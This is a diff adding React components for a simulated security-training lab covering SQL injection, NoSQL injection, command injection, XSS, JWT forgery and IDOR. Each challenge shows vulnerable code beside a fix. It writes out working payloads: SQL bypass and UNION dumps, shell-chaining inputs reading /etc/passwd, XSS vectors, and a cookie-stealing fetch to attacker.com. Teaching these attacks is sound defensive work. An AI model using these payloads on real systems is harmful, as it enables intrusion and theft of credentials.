+  const [lines, setLines] = useState([{ type: "info", text: "SQL Injection Lab initialized. Choose a challenge." }]);
+  const [loading, setLoading] = useState(false);
+  const [f0, setF0] = useState({ username: "", password: "" });
+  const [f1, setF1] = useState({ q: "" });
+  const [f2, setF2] = useState({ id: "" });
+  const [flags, setFlags] = useState({});
+
+  const push = (newLines) => setLines((p) => [...p, ...newLines]);
+
+  const run0 = () => {
+    setLoading(true);
+    push([{ type: "prompt", text: `POST /labs/sql-injection/login  {username:"${f0.username}"}` }]);
+    setTimeout(() => {
+      const r = simulateSQL("login", f0);
+      push([
+        { type: "json", text: JSON.stringify(r, null, 2) },
+        r.flag ? { type: "flag", text: r.flag } : { type: r.success ? "success" : "error", text: r.message || (r.success ? "Login successful" : "Auth failed") },
+      ]);
+      if (r.flag) { setFlags((p) => ({ ...p, 0: r.flag })); onSolve?.("sqli-001", r.flag, 50); }
+      setLoading(false);
+    }, 600);
+  };
+
+  const run1 = () => {
+    setLoading(true);
+    push([{ type: "prompt", text: `GET /labs/sql-injection/products/search?q=${encodeURIComponent(f1.q)}` }]);
+    setTimeout(() => {
+      const r = simulateSQL("search", f1);
+      push([{ type: "json", text: JSON.stringify(r, null, 2) }]);
+      if (r.flag) { setFlags((p) => ({ ...p, 1: r.flag })); push([{ type: "flag", text: r.flag }]); onSolve?.("sqli-002", r.flag, 100); }
+      setLoading(false);
+    }, 700);
+  };
+
+  const run2 = () => {
+    setLoading(true);
+    push([{ type: "prompt", text: `GET /labs/sql-injection/user-check?id=${f2.id}` }]);
+    setTimeout(() => {
+      const r = simulateSQL("blind", f2);
+      push([{ type: "json", text: JSON.stringify(r, null, 2) }]);
+      if (r.flag) { setFlags((p) => ({ ...p, 2: r.flag })); push([{ type: "flag", text: r.flag }]); onSolve?.("sqli-003", r.flag, 200); }
+      setLoading(false);
+    }, 500);
+  };
+
+  const CHALLENGES = [
+    {
+      title: "Login Bypass",
+      diff: "beginner",
+      pts: 50,
+      objective: "Bypass the login form without knowing the admin password. The query uses raw string concatenation.",
+      fields: (
+        <>
+          <div className="input-group"><label className="input-label">Username</label><input className="input" placeholder="Try:  ' OR 1=1 --" value={f0.username} onChange={e => setF0(p => ({ ...p, username: e.target.value }))} onKeyDown={e => e.key === "Enter" && run0()} /></div>
+          <div className="input-group"><label className="input-label">Password</label><input className="input" placeholder="anything" value={f0.password} onChange={e => setF0(p => ({ ...p, password: e.target.value }))} onKeyDown={e => e.key === "Enter" && run0()} /></div>
+          <button className="btn btn-red" onClick={run0} disabled={loading}>⚡ Submit Login</button>
+        </>
+      ),
+      vuln: `<span class="c-comment">// ⚠️  VULNERABLE — string concatenation</span>
+<span class="c-kw">const</span> query = <span class="c-str">\`SELECT * FROM users
+  WHERE username='<span class="c-vuln">\${username}</span>'
+  AND password=MD5('<span class="c-vuln">\${password}</span>')\`</span>;
+
+<span class="c-comment">// Input: ' OR 1=1 --
+// Query becomes:
+//   WHERE username='' OR 1=1 --'
+//   1=1 is ALWAYS TRUE → admin access!</span>`,
+      safe: `<span class="c-comment">// ✅  SECURE — parameterized query</span>
+<span class="c-kw">const</span> query = <span class="c-str">'SELECT * FROM users WHERE username=? AND password=MD5(?)'</span>;
+<span class="c-kw">await</span> pool.<span class="c-fn">execute</span>(query, [username, password]);
+<span class="c-comment">// Input is DATA, never SQL code</span>`,
+      hints: ["The query concatenates your username: WHERE username='YOUR_INPUT'", "A single quote ' breaks out of the string — try it", "Classic payload:  ' OR 1=1 --   (always-true + comment out rest)", "Try:  admin'--  to log in as admin, ignoring the password check"],
+    },
+    {
+      title: "UNION Extraction",
+      diff: "intermediate",
+      pts: 100,
+      objective: "Use UNION SELECT to extract the users table (passwords, emails) from the product search endpoint.",
+      fields: (
+        <>
+          <div className="input-group"><label className="input-label">Search Query</label><input className="input" placeholder="' UNION SELECT id,username,password,email,role FROM users--" value={f1.q} onChange={e => setF1({ q: e.target.value })} onKeyDown={e => e.key === "Enter" && run1()} /></div>
+          <button className="btn btn-red" onClick={run1} disabled={loading}>⚡ Search Products</button>
+        </>
+      ),
+      vuln: `<span class="c-comment">// ⚠️  VULNERABLE — search param injected</span>
+<span class="c-kw">const</span> query = <span class="c-str">\`SELECT id,name,description,price,category
+  FROM products WHERE name LIKE '%<span class="c-vuln">\${search}</span>%'\`</span>;
+
+<span class="c-comment">// Inject: ' UNION SELECT id,username,password,email,role FROM users--
+// Appends your query — dumps the users table!</span>`,
+      safe: `<span class="c-comment">// ✅  SECURE — parameterized LIKE</span>
+<span class="c-kw">await</span> pool.<span class="c-fn">execute</span>(
+  <span class="c-str">'SELECT id,name,description,price,category FROM products WHERE name LIKE ?'</span>,
+  [<span class="c-str">\`%\${search}%\`</span>]
+);`,
+      hints: ["First count columns: ' ORDER BY 1-- then 2-- then 3-- until error", "Craft UNION: ' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "Replace with real data: ' UNION SELECT id,username,password,email,role FROM users--", "The users table has columns: id, username, password, email, role"],
+    },
+    {
+      title: "Blind Boolean",
+      diff: "advanced",
+      pts: 200,
+      objective: "Only 'found' or 'not found' is returned. Use boolean conditions to infer the admin's password hash character by character.",
+      fields: (
+        <>
+          <div className="input-group"><label className="input-label">User ID</label><input className="input" placeholder="1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='0'" value={f2.id} onChange={e => setF2({ id: e.target.value })} onKeyDown={e => e.key === "Enter" && run2()} /></div>
+          <button className="btn btn-red" onClick={run2} disabled={loading}>⚡ Check User</button>
+        </>
+      ),
+      vuln: `<span class="c-comment">// ⚠️  VULNERABLE — id not cast to integer</span>
+<span class="c-kw">const</span> query = <span class="c-str">\`SELECT id FROM users WHERE id=<span class="c-vuln">\${id}</span> AND is_active=1\`</span>;
+<span class="c-comment">// Only returns: { found: true } or { found: false }
+//
+// Blind exploit:
+// id=1 AND 1=1  → found (TRUE condition)
+// id=1 AND 1=2  → not found (FALSE condition)
+// id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='0'
+//   → infer first char of admin hash!</span>`,
+      safe: `<span class="c-comment">// ✅  SECURE — cast to integer first</span>
+<span class="c-kw">const</span> safeId = <span class="c-fn">parseInt</span>(id);
+<span class="c-kw">if</span> (<span class="c-fn">isNaN</span>(safeId)) <span class="c-kw">return</span> res.<span class="c-fn">status</span>(400).json({ error: <span class="c-str">'Invalid'</span> });
+<span class="c-kw">await</span> pool.<span class="c-fn">execute</span>(<span class="c-str">'SELECT id FROM users WHERE id=? AND is_active=1'</span>, [safeId]);`,
+      hints: ["Test it: id=1 AND 1=1 → found | id=1 AND 1=2 → not found", "Extract char: 1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='0'", "Iterate all 32 positions + hex chars (0-9,a-f) to reconstruct the MD5", "Automate: sqlmap -u 'url?id=1' --technique=B --dump"],
+    },
+  ];
+
+  const ch = CHALLENGES[tab];
+
+  return (
+    <div className="lab-view">
+      <div className="challenge-tabs">
+        {CHALLENGES.map((c, i) => (
+          <button key={i} className={`challenge-tab ${tab === i ? "active" : ""} ${flags[i] ? "solved" : ""}`} onClick={() => setTab(i)}>
+            {c.title} <span style={{ fontSize: ".62rem", color: "#3a4a5a", marginLeft: ".25rem" }}>({c.pts}pts)</span>
+          </button>
+        ))}
+      </div>
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 Objective</strong>{ch.objective}</div>
+          <div className="section-title">Attack Console</div>
+          {ch.fields}
+          <div style={{ marginTop: "1.25rem", display: "flex", flexDirection: "column", gap: ".5rem" }}>
+            <CodeBox label="Vulnerable Code" code={ch.vuln} variant="vuln" />
+            <CodeBox label="Secure Fix" code={ch.safe} variant="safe" />
+          </div>
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {flags[tab] && <div className="flag-box"><div className="flag-label">🚩 Flag Captured</div><div className="flag-value">{flags[tab]}</div></div>}
+          <Hints hints={ch.hints} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function NoSQLLab({ onSolve }) {
+  const [lines, setLines] = useState([{ type: "info", text: "NoSQL Injection Lab — MongoDB operator injection." }]);
+  const [loading, setLoading] = useState(false);
+  const [useObject, setUseObject] = useState(false);
+  const [username, setUsername] = useState("admin");
+  const [pwdStr, setPwdStr] = useState("wrongpassword");
+  const [operator, setOperator] = useState("$ne");
+  const [flag, setFlag] = useState(null);
+
+  const run = () => {
+    setLoading(true);
+    const password = useObject ? { [operator]: "" } : pwdStr;
+    setLines((p) => [...p, { type: "prompt", text: `POST /labs/nosql-injection/login` }, { type: "json", text: `Body: ${JSON.stringify({ username, password }, null, 2)}` }]);
+    setTimeout(() => {
+      const r = simulateNoSQL({ username, password });
+      setLines((p) => [...p, { type: "json", text: JSON.stringify(r, null, 2) }]);
+      if (r.flag) { setFlag(r.flag); setLines((p) => [...p, { type: "flag", text: r.flag }]); onSolve?.("nosql-001", r.flag, 150); }
+      setLoading(false);
+    }, 600);
+  };
+
+  return (
+    <div className="lab-view">
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 Objective</strong>Bypass MongoDB authentication by injecting operators instead of a password string. The app passes req.body directly to findOne().</div>
+          <div className="section-title">Attack Console</div>
+          <div className="input-group"><label className="input-label">Username</label><input className="input" value={username} onChange={e => setUsername(e.target.value)} /></div>
+          <div className="input-group">
+            <label className="input-label">Password Mode</label>
+            <select className="input" value={useObject ? "obj" : "str"} onChange={e => setUseObject(e.target.value === "obj")}>
+              <option value="str">String (normal)</option>
+              <option value="obj">Object / Operator (inject!)</option>
+            </select>
+          </div>
+          {useObject ? (
+            <div className="input-group">
+              <label className="input-label">MongoDB Operator</label>
+              <select className="input" value={operator} onChange={e => setOperator(e.target.value)}>
+                <option value="$ne">$ne — not equal (bypass!)</option>
+                <option value="$gt">$gt — greater than</option>
+                <option value="$regex">$regex — regex match</option>
+              </select>
+              <div style={{ fontSize: ".7rem", color: "#566070", marginTop: ".4rem" }}>
+                Sends: <code style={{ color: "#ffa502" }}>{`{"password": {"${operator}": ""}}`}</code>
+              </div>
+            </div>
+          ) : (
+            <div className="input-group"><label className="input-label">Password</label><input className="input" value={pwdStr} onChange={e => setPwdStr(e.target.value)} /></div>
+          )}
+          <button className="btn btn-red" onClick={run} disabled={loading}>⚡ Login</button>
+          <div style={{ marginTop: "1.25rem", display: "flex", flexDirection: "column", gap: ".5rem" }}>
+            <CodeBox label="Vulnerable Code" variant="vuln" code={`<span class="c-comment">// ⚠️  VULNERABLE — req.body passed directly to MongoDB</span>
+<span class="c-kw">const</span> { username, password } = req.body;
+<span class="c-kw">const</span> user = <span class="c-kw">await</span> User.<span class="c-fn">findOne</span>({ username, <span class="c-vuln">password</span> });
+<span class="c-comment">// If password = {"$ne":""} MongoDB sees:
+// WHERE password != ""  → matches ANY non-empty password!</span>`} />
+            <CodeBox label="Secure Fix" variant="safe" code={`<span class="c-comment">// ✅  SECURE — type validation</span>
+<span class="c-kw">if</span> (<span class="c-kw">typeof</span> password !== <span class="c-str">'string'</span>) <span class="c-kw">return</span> res.<span class="c-fn">status</span>(400).json({ error: <span class="c-str">'Invalid'</span> });
+<span class="c-comment">// Use bcrypt comparison OUTSIDE the query</span>
+<span class="c-kw">const</span> user = <span class="c-kw">await</span> User.<span class="c-fn">findOne</span>({ username });
+<span class="c-kw">const</span> ok = <span class="c-kw">await</span> bcrypt.<span class="c-fn">compare</span>(password, user.passwordHash);`} />
+          </div>
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {flag && <div className="flag-box"><div className="flag-label">🚩 Flag Captured</div><div className="flag-value">{flag}</div></div>}
+          <Hints hints={["MongoDB supports operators: $ne, $gt, $regex, $where in query objects", "Switch Password Mode to 'Object' to inject an operator instead of a string", "$ne: '' means 'password is not equal to empty string' — matches anything!", "The fix is simple: check typeof password === 'string' before the query"]} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function CmdInjectionLab({ onSolve }) {
+  const [ip, setIp] = useState("127.0.0.1");
+  const [lines, setLines] = useState([{ type: "info", text: "Command Injection Lab — ping diagnostic tool." }]);
+  const [loading, setLoading] = useState(false);
+  const [flag, setFlag] = useState(null);
+
+  const run = () => {
+    setLoading(true);
+    setLines((p) => [...p, { type: "prompt", text: `POST /labs/cmd-injection/ping  {ip:"${ip}"}` }]);
+    setTimeout(() => {
+      const r = simulateCmd(ip);
+      setLines((p) => [...p, { type: "out", text: `$ ${r.command}` }, ...r.output.split("\n").map(t => ({ type: "out", text: t }))]);
+      if (r.flag) { setFlag(r.flag); setLines((p) => [...p, { type: "flag", text: r.flag }]); onSolve?.("cmdi-001", r.flag, 100); }
+      if (r.explanation) setLines((p) => [...p, { type: "info", text: r.explanation }]);
+      setLoading(false);
+    }, 800);
+  };
+
+  const PAYLOADS = ["127.0.0.1; id", "127.0.0.1; whoami", "127.0.0.1; cat /flag.txt", "127.0.0.1; cat /etc/passwd", "127.0.0.1; env", "127.0.0.1 && uname", "127.0.0.1 | ls"];
+
+  return (
+    <div className="lab-view">
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 Objective</strong>The ping tool passes your input directly to exec(). Inject shell metacharacters to chain OS commands and read /flag.txt.</div>
+          <div className="section-title">Attack Console</div>
+          <div className="input-group"><label className="input-label">IP Address / Payload</label><input className="input" value={ip} onChange={e => setIp(e.target.value)} onKeyDown={e => e.key === "Enter" && run()} placeholder="127.0.0.1" /></div>
+          <div style={{ display: "flex", flexWrap: "wrap", gap: ".35rem", marginBottom: "1rem" }}>
+            {PAYLOADS.map(p => <button key={p} className="btn btn-sm" onClick={() => setIp(p)} style={{ background: "rgba(255,68,68,.07)", color: "#ff6666", border: "1px solid rgba(255,68,68,.15)", fontSize: ".65rem" }}>{p}</button>)}
+          </div>
+          <button className="btn btn-red" onClick={run} disabled={loading}>⚡ Ping Host</button>
+          <div style={{ marginTop: "1.25rem", display: "flex", flexDirection: "column", gap: ".5rem" }}>
+            <CodeBox label="Vulnerable Code" variant="vuln" code={`<span class="c-comment">// ⚠️  VULNERABLE — exec() with string concat</span>
+<span class="c-kw">const</span> command = <span class="c-str">\`ping -c 2 <span class="c-vuln">\${ip}</span>\`</span>;
+<span class="c-fn">exec</span>(command); <span class="c-comment">// Spawns a shell!</span>
+
+<span class="c-comment">// Input: 127.0.0.1; cat /etc/passwd
+// Shell runs: ping -c 2 127.0.0.1 ; cat /etc/passwd
+//   ; chains commands → RCE!</span>`} />
+            <CodeBox label="Secure Fix" variant="safe" code={`<span class="c-comment">// ✅  SECURE — execFile() with argument array</span>
+<span class="c-kw">const</span> ipRegex = <span class="c-str">/^(\\d{1,3}\\.){3}\\d{1,3}$/</span>;
+<span class="c-kw">if</span> (!ipRegex.<span class="c-fn">test</span>(ip)) <span class="c-kw">return</span> res.<span class="c-fn">status</span>(400).json({ error: <span class="c-str">'Bad IP'</span> });
+<span class="c-fn">execFile</span>(<span class="c-str">'ping'</span>, [<span class="c-str">'-c'</span>, <span class="c-str">'2'</span>, ip]); <span class="c-comment">// No shell spawned</span>`} />
+          </div>
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {flag && <div className="flag-box"><div className="flag-label">🚩 Flag Captured</div><div className="flag-value">{flag}</div></div>}
+          <Hints hints={["The server runs: exec(`ping -c 2 ${ip}`) — a shell is involved!", "Shell metacharacters chain commands: ; && || | ` $()", "Payload: 127.0.0.1; whoami — runs ping, then whoami", "Get the flag: 127.0.0.1; cat /flag.txt"]} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function XSSLab({ onSolve }) {
+  const [tab, setTab] = useState(0);
+  const [input, setInput] = useState("");
+  const [lines, setLines] = useState([{ type: "info", text: "XSS Lab — Cross-Site Scripting attacks." }]);
+  const [loading, setLoading] = useState(false);
+  const [flags, setFlags] = useState({});
+  const [comments, setComments] = useState([{ user: "alice", text: "Great product! Highly recommend." }, { user: "john", text: "Very useful for pentesting." }]);
+  const [reflectedOutput, setReflectedOutput] = useState(null);
+
+  const TABS = [
+    { title: "Stored XSS", pts: 75, placeholder: "<script>alert(document.cookie)</script>" },
+    { title: "Reflected XSS", pts: 60, placeholder: "<img src=x onerror=alert(1)>" },
+    { title: "DOM XSS", pts: 65, placeholder: "<svg onload=alert(1)>" },
+  ];
+
+  const run = () => {
+    setLoading(true);
+    setLines((p) => [...p, { type: "prompt", text: tab === 0 ? `POST /labs/xss/stored/comments  {content:"${input.slice(0,40)}..."}` : `GET /labs/xss/reflected/search?q=${encodeURIComponent(input.slice(0,40))}` }]);
+    setTimeout(() => {
+      const r = simulateXSS(tab === 0 ? "stored" : "reflected", input);
+      if (tab === 0 && r.stored) {
+        setComments((p) => [...p, { user: "you", text: input, raw: true }]);
+        setLines((p) => [...p, { type: "success", text: "Comment stored in database." }]);
+        if (r.flag) { setFlags((p) => ({ ...p, [tab]: r.flag })); setLines((p) => [...p, { type: "flag", text: r.flag }, { type: "info", text: r.explanation }]); onSolve?.("xss-stored-001", r.flag, 75); }
+      }
+      if (tab === 1 && r.reflected) {
+        setReflectedOutput(r.html);
+        setLines((p) => [...p, { type: "out", text: `Response HTML: ${r.html}` }]);
+        if (r.flag) { setFlags((p) => ({ ...p, [tab]: r.flag })); setLines((p) => [...p, { type: "flag", text: r.flag }, { type: "info", text: r.explanation }]); onSolve?.("xss-reflected-001", r.flag, 60); }
+      }
+      if (tab === 2) {
+        const isXSS = input.includes("<") && (input.includes("script") || input.includes("on") || input.includes("svg"));
+        setLines((p) => [...p, { type: "out", text: `DOM processes: location.hash = "${input}"` }, { type: "out", text: `document.getElementById('welcome').innerHTML = "Hello, ${input}"` }]);
+        if (isXSS) { setFlags((p) => ({ ...p, [tab]: "FLAG{dom_xss_achieved}" })); setLines((p) => [...p, { type: "flag", text: "FLAG{dom_xss_achieved}" }, { type: "info", text: "innerHTML executed your payload client-side — no server involved. Use textContent instead!" }]); onSolve?.("xss-dom-001", "FLAG{dom_xss_achieved}", 65); }
+      }
+      setLoading(false);
+    }, 500);
+  };
+
+  return (
+    <div className="lab-view">
+      <div className="challenge-tabs">
+        {TABS.map((t, i) => <button key={i} className={`challenge-tab ${tab === i ? "active" : ""} ${flags[i] ? "solved" : ""}`} onClick={() => { setTab(i); setInput(""); setReflectedOutput(null); }}>{t.title} ({t.pts}pts)</button>)}
+      </div>
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 {TABS[tab].title}</strong>
+            {tab === 0 && "Post a comment with a JavaScript payload. The server stores raw HTML — your script executes for every user who views the page."}
+            {tab === 1 && "The search parameter is reflected directly into the HTML response. Craft a URL-based payload that executes in the victim's browser."}
+            {tab === 2 && "The page reads location.hash and writes it to innerHTML — no server involved. Inject via the hash fragment."}</div>
+          <div className="section-title">Payload Input</div>
+          <div className="input-group"><label className="input-label">{tab === 0 ? "Comment Content" : tab === 1 ? "Search Query" : "Hash / DOM Input"}</label><input className="input" placeholder={TABS[tab].placeholder} value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key === "Enter" && run()} /></div>
+          <div style={{ display: "flex", gap: ".4rem", flexWrap: "wrap", marginBottom: "1rem" }}>
+            {["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<body onload=alert(1)>"].map(p => <button key={p} className="btn btn-sm" onClick={() => setInput(p)} style={{ background: "rgba(170,68,255,.07)", color: "#aa88ff", border: "1px solid rgba(170,68,255,.15)", fontSize: ".62rem" }}>{p}</button>)}
+          </div>
+          <button className="btn btn-red" onClick={run} disabled={loading}>⚡ {tab === 0 ? "Post Comment" : tab === 1 ? "Search" : "Inject DOM"}</button>
+
+          {tab === 0 && (
+            <div style={{ marginTop: "1.25rem" }}>
+              <div className="section-title">Comment Board (vulnerable)</div>
+              <div style={{ background: "#040710", border: "1px solid #1e2d4a", borderRadius: "6px", padding: ".875rem" }}>
+                {comments.map((c, i) => (
+                  <div key={i} style={{ padding: ".5rem 0", borderBottom: i < comments.length - 1 ? "1px solid #0f1e32" : "none" }}>
+                    <span style={{ color: "#00aaff", fontSize: ".7rem" }}>{c.user}: </span>
+                    {c.raw ? <span style={{ color: "#ff4444", fontSize: ".75rem" }} dangerouslySetInnerHTML={{ __html: c.text }} /> : <span style={{ color: "#8899aa", fontSize: ".75rem" }}>{c.text}</span>}
+                  </div>
+                ))}
+              </div>
+              <div style={{ fontSize: ".65rem", color: "#ff4444", marginTop: ".4rem" }}>⚠️ Above renders raw HTML — innerHTML without sanitization</div>
+            </div>
+          )}
+
+          {tab === 1 && reflectedOutput && (
+            <div style={{ marginTop: "1rem" }}>
+              <div className="section-title">Server Response (unsanitized)</div>
+              <div style={{ background: "#040710", border: "1px solid rgba(255,68,68,.2)", borderRadius: "6px", padding: ".875rem", fontSize: ".75rem", color: "#ff4444" }} dangerouslySetInnerHTML={{ __html: reflectedOutput }} />
+              <div style={{ fontSize: ".65rem", color: "#ff4444", marginTop: ".4rem" }}>⚠️ Your input was reflected in HTML without encoding</div>
+            </div>
+          )}
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {flags[tab] && <div className="flag-box"><div className="flag-label">🚩 Flag Captured</div><div className="flag-value">{flags[tab]}</div></div>}
+          <Hints hints={tab === 0
+            ? ["Comments are stored in DB and rendered via innerHTML — a script tag will execute!", "Try: <script>alert(document.cookie)</script>", "Real attack: <script>fetch('https://attacker.com?c='+document.cookie)</script>", "Fix: escape HTML before storing/rendering. Use DOMPurify or textContent."]
+            : tab === 1
+            ? ["The ?q= parameter value appears directly in the HTML response", "Try: <script>alert(1)</script>", "Or use event handlers: <img src=x onerror=alert(document.domain)>", "Fix: HTML-encode output — replace < with &lt; > with &gt; etc."]
+            : ["No server involved — this is 100% client-side", "The page reads location.hash and writes it to innerHTML", "Inject: #<img src=x onerror=alert(1)>", "Fix: use textContent instead of innerHTML for user data"]} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function JWTLab({ onSolve }) {
+  const [token, setToken] = useState("");
+  const [decoded, setDecoded] = useState(null);
+  const [lines, setLines] = useState([{ type: "info", text: "JWT Lab — decode, forge, and attack JSON Web Tokens." }]);
+  const [loading, setLoading] = useState(false);
+  const [flag, setFlag] = useState(null);
+  const [builderHeader, setBuilderHeader] = useState('{"alg":"none","typ":"JWT"}');
+  const [builderPayload, setBuilderPayload] = useState('{"id":1,"username":"john","role":"admin","iat":1700000000}');
+
+  const SAMPLE_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJqb2huIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
+
+  const decode = () => {
+    try {
+      const parts = token.split(".");
+      const h = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
+      const p = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
+      setDecoded({ header: h, payload: p, sig: parts[2] || "(none)" });
+      setLines((prev) => [...prev, { type: "prompt", text: "decode JWT" }, { type: "success", text: "Decoded successfully" }, { type: "json", text: JSON.stringify({ header: h, payload: p }, null, 2) }]);
+    } catch {
+      setLines((prev) => [...prev, { type: "error", text: "Failed to decode — check token format" }]);
+    }
+  };
+
+  const buildForged = () => {
+    try {
+      const h = btoa(builderHeader).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
+      const p = btoa(builderPayload).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
+      const forged = `${h}.${p}.`;
+      setToken(forged);
+      setLines((prev) => [...prev, { type: "warn", text: "Forged token built (alg:none, no signature)" }, { type: "out", text: forged }]);
+    } catch {
+      setLines((prev) => [...prev, { type: "error", text: "Invalid JSON in header or payload" }]);
+    }
+  };
+
+  const submit = () => {
+    setLoading(true);
+    setLines((p) => [...p, { type: "prompt", text: `GET /labs/jwt/admin-panel  Authorization: Bearer ${token.slice(0, 40)}...` }]);
+    setTimeout(() => {
+      const r = simulateJWT(token);
+      setLines((p) => [...p, { type: "json", text: JSON.stringify(r, null, 2) }]);
+      if (r.flag) { setFlag(r.flag); setLines((p) => [...p, { type: "flag", text: r.flag }, { type: "info", text: r.explanation }]); onSolve?.("jwt-001", r.flag, 250); }
+      if (r.error) setLines((p) => [...p, { type: "error", text: r.error }]);
+      setLoading(false);
+    }, 600);
+  };
+
+  return (
+    <div className="lab-view">
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 Objective</strong>The server accepts JWTs with alg:none — no signature required. Build a forged admin token and access the admin panel.</div>
+          <div className="section-title">Step 1 — Decode a Sample Token</div>
+          <div className="input-group">
+            <label className="input-label">JWT Token</label>
+            <textarea className="input" rows={3} style={{ resize: "vertical", minHeight: "70px" }} placeholder="Paste JWT here" value={token} onChange={e => setToken(e.target.value)} />
+          </div>
+          <div style={{ display: "flex", gap: ".4rem", marginBottom: "1rem", flexWrap: "wrap" }}>
+            <button className="btn btn-blue btn-sm" onClick={() => { setToken(SAMPLE_TOKEN); setTimeout(decode, 100); }}>Load Sample Token</button>
+            <button className="btn btn-ghost btn-sm" onClick={decode} disabled={!token}>Decode</button>
+          </div>
+          <div className="section-title">Step 2 — Forge Admin Token (alg:none)</div>
+          <div className="input-group"><label className="input-label">JWT Header</label><textarea className="input" rows={2} value={builderHeader} onChange={e => setBuilderHeader(e.target.value)} /></div>
+          <div className="input-group"><label className="input-label">JWT Payload (set role:"admin")</label><textarea className="input" rows={3} value={builderPayload} onChange={e => setBuilderPayload(e.target.value)} /></div>
+          <div style={{ display: "flex", gap: ".5rem" }}>
+            <button className="btn btn-ghost" onClick={buildForged}>Build Forged Token</button>
+            <button className="btn btn-red" onClick={submit} disabled={!token || loading}>⚡ Submit to Admin Panel</button>
+          </div>
+          <div style={{ marginTop: "1.25rem" }}>
+            <CodeBox label="Vulnerable Code" variant="vuln" code={`<span class="c-comment">// ⚠️  VULNERABLE — accepts alg:none</span>
+<span class="c-kw">const</span> header = JSON.<span class="c-fn">parse</span>(<span class="c-fn">atob</span>(token.<span class="c-fn">split</span>(<span class="c-str">'.'</span>)[0]));
+<span class="c-kw">if</span> (header.alg === <span class="c-str">'none'</span>) {
+  <span class="c-comment">// No signature check — trust the payload!</span>
+  decoded = JSON.<span class="c-fn">parse</span>(<span class="c-fn">atob</span>(parts[1]));
+}
+<span class="c-comment">// Attacker sets alg:none → no signature needed
+// Then sets role:"admin" in payload → escalation!</span>`} />
+          </div>
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {flag && <div className="flag-box"><div className="flag-label">🚩 Flag Captured</div><div className="flag-value">{flag}</div></div>}
+          {decoded && (
+            <div className="explain-box">
+              <div style={{ marginBottom: ".4rem" }}><strong>Decoded Header:</strong> alg={decoded.header.alg}</div>
+              <div style={{ marginBottom: ".4rem" }}><strong>Decoded Payload:</strong> role={decoded.payload.role}, user={decoded.payload.username}</div>
+              <div><strong>Signature:</strong> {decoded.sig.slice(0, 20)}...</div>
+            </div>
+          )}
+          <Hints hints={["Decode any JWT at jwt.io or manually: base64url-decode each part", "Change the header alg from 'HS256' to 'none' — this tells the server to skip signature verification", "Change the payload role from 'user' to 'admin'", "Re-encode both parts as base64url, join with dots, add trailing dot: header.payload. (empty sig)"]} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function IDORLab({ onSolve }) {
+  const [userId, setUserId] = useState("4");
+  const [docId, setDocId] = useState("4");
+  const [lines, setLines] = useState([{ type: "info", text: "IDOR Lab — Insecure Direct Object Reference." }]);
+  const [loading, setLoading] = useState(false);
+  const [flag, setFlag] = useState(null);
+
+  const run = () => {
+    setLoading(true);
+    setLines((p) => [...p, { type: "prompt", text: `GET /api/documents/${docId}  X-User-Id: ${userId}` }]);
+    setTimeout(() => {
+      const r = simulateIDOR(userId, parseInt(docId));
+      setLines((p) => [...p, { type: "json", text: JSON.stringify(r, null, 2) }]);
+      if (r.flag) { setFlag(r.flag); setLines((p) => [...p, { type: "flag", text: r.flag }, { type: "warn", text: r.warning }]); onSolve?.("idor-001", r.flag, 150); }
+      setLoading(false);
+    }, 400);
+  };
+
+  return (
+    <div className="lab-view">
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 Objective</strong>You are logged in as user 4 (bob). The /api/documents/:id endpoint has no ownership check. Access document #1 which belongs to the admin.</div>
+          <div className="section-title">Attack Console</div>
+          <div className="input-group">
+            <label className="input-label">Your User ID (authenticated as)</label>
+            <select className="input" value={userId} onChange={e => setUserId(e.target.value)}>
+              <option value="4">4 — bob (your account)</option>
+              <option value="3">3 — alice</option>
+              <option value="2">2 — john</option>
+            </select>
+          </div>
+          <div className="input-group">
+            <label className="input-label">Document ID to access</label>
+            <select className="input" value={docId} onChange={e => setDocId(e.target.value)}>
+              {[1, 2, 3, 4].map(i => <option key={i} value={i}>Document #{i}</option>)}
+            </select>
+          </div>
+          <button className="btn btn-red" onClick={run} disabled={loading}>⚡ Fetch Document</button>
+          <div style={{ marginTop: "1.25rem", display: "flex", flexDirection: "column", gap: ".5rem" }}>
+            <CodeBox label="Vulnerable Code" variant="vuln" code={`<span class="c-comment">// ⚠️  VULNERABLE — no ownership check</span>
+router.<span class="c-fn">get</span>(<span class="c-str">'/documents/:id'</span>, <span class="c-kw">async</span> (req, res) => {
+  <span class="c-comment">// Fetches ANY document by ID — no user check!</span>
+  <span class="c-kw">const</span> doc = <span class="c-kw">await</span> db.<span class="c-fn">query</span>(
+    <span class="c-str">'SELECT * FROM documents WHERE id = ?'</span>, [req.params.id]
+  );
